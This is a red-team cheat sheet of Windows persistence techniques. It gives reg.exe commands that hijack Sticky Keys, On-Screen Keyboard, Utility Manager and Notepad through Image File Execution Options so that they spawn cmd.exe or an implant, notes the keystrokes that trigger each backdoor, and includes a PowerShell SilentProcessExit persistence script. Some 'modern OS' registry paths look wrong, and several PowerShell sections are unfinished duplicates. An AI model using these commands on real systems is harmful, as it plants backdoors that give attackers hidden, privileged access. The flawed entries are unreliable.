---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - T1015
  - windows
---
# Living off the Land

## Sticky Keys

> [!INFO] Shortcut Key
> To trigger the backdoor hit `SHIFT` 5 times

### Command Prompt

For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\System32\cmd.exe" /f
```

For modern operating systems

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\System32\cmd.exe" /f
```

### PowerShell

TODO: Convert the commands to cmdlets

For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\System32\cmd.exe" /f
```

For modern operating systems

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\System32\cmd.exe" /f
```

## Accessibility On-Screen Keyboard

### Command Prompt

For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\System32\cmd.exe" /f
```

For modern operating systems

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\System32\cmd.exe" /f
```

### PowerShell

TODO: Convert the commands to cmdlets

## Utility Manager

> [!INFO] Shortcut Key
> To trigger the backdoor hit `Win + U`

### Command Prompt

For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
```

For modern operating systems

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\windows\System32\cmd.exe" /f
```

### PowerShell

TODO: Convert the commands to cmdlets

## Notepad

### Command Prompt

For legacy operating systems below Windows 7 and Windows 2008 R2

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad" /v Debugger /d "C:\path\to\implant.exe" /f
```

For modern operating systems

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Image File Execution Options\notepad" /v Debugger /d "C:\path\to\implant.exe" /f
```

### PowerShell

TODO: Convert the commands to cmdlets

## SilentProcessExit

### Batch

```

```

### PowerShell

```powershell
$monitoredApp = "notepad.exe"
$monitor = "powershell -c calc.exe #"

New-Item -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$monitoredApp" | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$monitoredApp" -Name GlobalFlag -Value 512

New-Item -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$monitoredApp" | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$monitoredApp" -Name ReportingMode -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$monitoredApp" -Name MonitorProcess -Value $monitor
```

---
## References

### LOFLCAB

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

### Persistence Info

- [Persistence Info: Image File Execution Options](https://persistence-info.github.io/Data/ifeo.html)

- [Persistence Info: Monitoring Silent Process Exit](https://persistence-info.github.io/Data/silentexitmonitor.html)

### Red Team Notes

- [Red Team Notes: Sticky Keys](https://www.ired.team/offensive-security/persistence/t1015-sethc)

### DoublePolsar

- [RDP hijacking - how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)